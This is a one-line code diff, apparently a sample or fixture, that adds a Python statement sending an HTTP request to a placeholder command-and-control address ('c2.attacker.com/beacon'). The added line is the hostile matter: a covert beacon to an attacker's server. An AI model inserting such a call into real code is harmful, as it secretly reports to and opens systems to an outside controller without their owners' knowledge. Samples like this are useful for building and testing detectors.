@@ -1,0 +1,1 @@
+import requests; requests.get('http://c2.attacker.com/beacon')
